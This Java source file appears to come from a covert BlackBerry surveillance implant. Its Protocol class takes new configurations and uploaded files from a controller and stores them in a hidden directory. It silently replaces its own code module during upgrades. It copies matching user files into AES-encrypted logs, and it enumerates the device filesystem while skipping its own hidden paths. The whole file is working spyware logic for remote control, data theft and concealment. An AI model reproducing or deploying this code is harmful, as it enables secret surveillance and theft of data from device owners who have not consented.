//#preprocess
package blackberry.action.sync;

import java.util.Date;
import java.util.Enumeration;

import javax.microedition.io.file.FileSystemRegistry;

import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.util.DataBuffer;
import blackberry.config.Conf;
import blackberry.config.Keys;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.AutoFlashFile;
import blackberry.fs.Directory;
import blackberry.fs.Path;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.transfer.CommandException;
import blackberry.transfer.Proto;
import blackberry.transfer.ProtocolException;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

public abstract class Protocol {
    public static final Object UPGRADE_FILENAME = "blackberry.core";

    //#ifdef DEBUG
    private static Debug debug = new Debug("Protocol", DebugLevel.VERBOSE);
    //#endif

    protected Transport transport;

    public boolean reload;
    public boolean uninstall;

    public boolean init(Transport transport) {
        this.transport = transport;
        return transport.initConnection();
    }

    public abstract boolean start() throws ProtocolException;

    public static boolean saveNewConf(byte[] conf, int offset)
            throws CommandException {
        final AutoFlashFile file = new AutoFlashFile(Conf.NEW_CONF_PATH
                + Conf.NEW_CONF, true);

        if (file.exists()) {
            file.delete();
        }

        file.create();
        final boolean ret = file.write(conf, offset, conf.length - offset);
        if (!ret) {
            throw new CommandException(); //"write"
        }

        return ret;
    }

    public static void saveUpload(String filename, byte[] content) {
        final AutoFlashFile file = new AutoFlashFile(Path.USER() + filename,
                true);

        if (file.exists()) {
            //#ifdef DEBUG
            debug.trace("getUpload replacing existing file: " + filename);
            //#endif
            file.delete();
        }
        file.create();
        file.write(content);

        //#ifdef DEBUG
        debug.trace("file written: " + file.exists());
        //#endif
    }

    public static boolean upgrade(byte[] codBuff) {
        // Delete it self.
        final int handle = CodeModuleManager.getModuleHandle(Conf.MODULE_NAME);
        if (handle != 0) {
            final int success = CodeModuleManager.deleteModuleEx(handle, true);
            //#ifdef DEBUG
            debug.info("deleted: " + success);
            //#endif
        } else {
            return false;
        }
        // Download new cod files(included sibling files).

        if (Utils.isZip(codBuff)) {
            //#ifdef DEBUG
            debug.warn("zip not supported");
            //#endif
            return false;
        } else {
            int newHandle = 0;
            // API REFERENCE:
            // You need to write the data in two separate chunks.
            // The first data chunk must be less thank 64KB in size.
            final int MAXAPPEND = 61440; // 1024*60;

            if (codBuff.length > MAXAPPEND) {
                newHandle = CodeModuleManager.createNewModule(codBuff.length,
                        codBuff, MAXAPPEND);

                final boolean appendSucc = CodeModuleManager.writeNewModule(
                        newHandle, MAXAPPEND, codBuff, MAXAPPEND,
                        codBuff.length - MAXAPPEND);

                codBuff = null;
            } else {
                newHandle = CodeModuleManager.createNewModule(codBuff.length,
                        codBuff, codBuff.length);

            }
            // install the module
            if (newHandle != 0) {
                final int savecode = CodeModuleManager.saveNewModule(newHandle,
                        true);
                if (savecode != CodeModuleManager.CMM_OK_MODULE_OVERWRITTEN) {
                    //#ifdef DEBUG
                    debug.error("Module not overwritten");
                    //#endif
                    return false;
                }
            }
            //#ifdef DEBUG
            debug.info("Module installed");
            //#endif

            // restart the blackberry if required
            if (CodeModuleManager.isResetRequired()) {
                //#ifdef DEBUG
                CodeModuleManager.promptForResetIfRequired();
                //#endif
                //#ifdef DEBUG
                debug.warn("Reset required");
                //#endif
            }
        }
        return true;
    }

    public static void saveDownloadLog(String filefilter) {
        AutoFlashFile file = new AutoFlashFile(filefilter, false);
        if (file.exists()) {
            //#ifdef DEBUG
            debug.trace("logging file: " + filefilter);
            //#endif
            saveFileLog(file, filefilter);
        } else {
            //#ifdef DEBUG
            debug.trace("not a file, try to expand it: " + filefilter);
            //#endif
            for (Enumeration enum = Directory.find(filefilter); enum
                    .hasMoreElements();) {
                String filename = (String) enum.nextElement();

                file = new AutoFlashFile(filename, false);
                if (file.isDirectory()) {
                    continue;
                }

                saveFileLog(file, filename);

                //#ifdef DEBUG
                debug.trace("logging file: " + filename);
                //#endif

            }
        }
    }

    private static void saveFileLog(AutoFlashFile file, String filename) {
        //#ifdef DBC
        Check.requires(file != null, "null file");
        Check.requires(file.exists(), "file should exist");
        Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
        Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
        //#endif

        byte[] content = file.read();
        byte[] additional = Protocol.logDownloadAdditional(filename);
        Log log = new Log(false, Keys.getInstance().getAesKey());
        log.createLog(additional, LogType.DOWNLOAD);
        log.writeLog(content);
        log.close();
    }

    private static byte[] logDownloadAdditional(String filename) {

        //#ifdef DBC
        Check.requires(filename != null, "null file");
        Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
        Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
        //#endif

        String path = Utils.chomp(Path.USER(), "/"); // UPLOAD_DIR
        int macroPos = filename.indexOf(path);
        if (macroPos >= 0) {
            //#ifdef DEBUG
            debug.trace("macropos: " + macroPos);
            //#endif
            String start = filename.substring(0, macroPos);
            String end = filename.substring(macroPos + path.length());

            filename = start + Directory.hiddenDirMacro + end;
        }

        //#ifdef DEBUG
        debug.trace("filename: " + filename);
        //#endif

        int version = 2008122901;
        byte[] wfilename = WChar.getBytes(filename);
        byte[] buffer = new byte[wfilename.length + 8];

        final DataBuffer databuffer = new DataBuffer(buffer, 0, buffer.length,
                false);

        databuffer.writeInt(version);
        databuffer.writeInt(wfilename.length);
        databuffer.write(wfilename);

        return buffer;
    }

    public static void saveFilesystem(int depth, String path) {
        Log fsLog = new Log(false, Keys.getInstance().getAesKey());
        fsLog.createLog(null, LogType.FILESYSTEM);

        // Expand path and create log
        if (path.equals("/")) {
            //#ifdef DEBUG
            debug.trace("sendFilesystem: root");
            //#endif
            expandRoot(fsLog, depth);
        } else {
            if (path.startsWith("//") && path.endsWith("/*")) {
                path = path.substring(1, path.length() - 2);

                expandPath(fsLog, path, depth);
            } else {
                //#ifdef DEBUG
                debug.error("sendFilesystem: strange path, ignoring it. "
                        + path);
                //#endif
            }
        }

        fsLog.close();
    }

    /**
     * Expand the root for a maximum depth. 0 means only root, 1 means its sons.
     * 
     * @param depth
     */
    private static void expandRoot(Log fsLog, int depth) {
        //#ifdef DBC
        Check.requires(depth > 0, "wrong recursion depth");
        //#endif

        saveRootLog(fsLog); // depth 0
        final Enumeration roots = FileSystemRegistry.listRoots();

        while (roots.hasMoreElements()) {
            String root = (String) roots.nextElement();
            if (root.endsWith("/")) {
                root = root.substring(0, root.length() - 1);
            }
            //#ifdef DEBUG
            debug.trace("expandRoot: " + root + " depth: " + depth);
            //#endif
            Protocol.saveFilesystemLog(fsLog, "/" + root); // depth 1
            if (depth - 1 > 0) {
                // if depth is 0, no recursion is required
                expandPath(fsLog, "/" + root, depth - 1); // depth 2+
            }
        }
    }

    private static boolean saveFilesystemLog(Log fsLog, String filepath) {
        //#ifdef DBC
        Check.requires(fsLog != null, "fsLog null");
        Check.requires(!filepath.endsWith("/"), "path shouldn't end with /");
        Check.requires(!filepath.endsWith("*"), "path shouldn't end with *");
        //#endif

        //#ifdef DEBUG
        debug.info("save FilesystemLog: " + filepath);
        //#endif
        int version = 2010031501;

        AutoFlashFile file = new AutoFlashFile(filepath);
        if (!file.exists()) {
            //#ifdef DEBUG
            debug.error("non existing file: " + filepath);
            //#endif
            return false;
        }

        byte[] w_filepath = WChar.getBytes(filepath, true);

        byte[] content = new byte[28 + w_filepath.length];
        DataBuffer databuffer = new DataBuffer(content, 0, content.length,
                false);

        databuffer.writeInt(version);
        databuffer.writeInt(w_filepath.length);

        int flags = 0;
        long size = file.getSize();

        boolean isDir = file.isDirectory();
        if (isDir) {
            flags |= 1;
        } else {
            if (size == 0) {
                flags |= 2;
            }
        }

        databuffer.writeInt(flags);
        databuffer.writeLong(size);
        databuffer.writeLong(DateTime.getFiledate(file.getFileTime()));
        databuffer.write(w_filepath);

        fsLog.writeLog(content);

        //#ifdef DEBUG
        debug.trace("expandPath: written log");
        //#endif

        return isDir;
    }

    /**
     * saves the root log. We use this method because the directory "/" cannot
     * be opened, we fake it.
     */
    private static void saveRootLog(Log fsLog) {
        int version = 2010031501;

        //#ifdef DBC
        Check.requires(fsLog != null, "fsLog null");
        //#endif
        byte[] content = new byte[30];
        DataBuffer databuffer = new DataBuffer(content, 0, content.length,
                false);
        databuffer.writeInt(version);
        databuffer.writeInt(2); // len
        databuffer.writeInt(1); // flags
        databuffer.writeLong(0);
        databuffer.writeLong(DateTime.getFiledate(new Date()));
        databuffer.write(WChar.getBytes("/"));

        fsLog.writeLog(content);
    }

    /**
     * Expand recursively the path saving the log. When depth is 0 saves the log
     * and stop recurring.
     * 
     * @param path
     * @param depth
     */
    private static void expandPath(Log fsLog, String path, int depth) {
        //#ifdef DBC
        Check.requires(depth > 0, "wrong recursion depth");
        Check.requires(path != null, "path==null");
        Check.requires(!path.endsWith("/"), "path shouldn't end with /");
        Check.requires(!path.endsWith("*"), "path shouldn't end with *");
        //#endif

        //#ifdef DEBUG
        debug.trace("expandPath: " + path + " depth: " + depth);
        //#endif

        //saveFilesystemLog(path);
        //if (depth > 0) {
        for (Enumeration enum = Directory.find(path + "/*"); enum
                .hasMoreElements();) {

            String dPath = path + "/" + (String) enum.nextElement();
            if (dPath.endsWith("/")) {
                //#ifdef DEBUG
                debug.trace("expandPath: dir");
                //#endif
                dPath = dPath.substring(0, dPath.length() - 1); // togli lo /
            } else {
                //#ifdef DEBUG
                debug.trace("expandPath: file");
                //#endif
            }

            if (dPath.indexOf(Utils.chomp(Path.SD(), "/")) >= 0
                    || dPath.indexOf(Utils.chomp(Path.USER(), "/")) >= 0) {
                //#ifdef DEBUG
                debug.warn("expandPath ignoring hidden path: " + dPath);
                //#endif
                continue;
            }

            boolean isDir = Protocol.saveFilesystemLog(fsLog, dPath);
            if (isDir && depth > 1) {
                expandPath(fsLog, dPath, depth - 1);
            }
        }
        //}
    }

}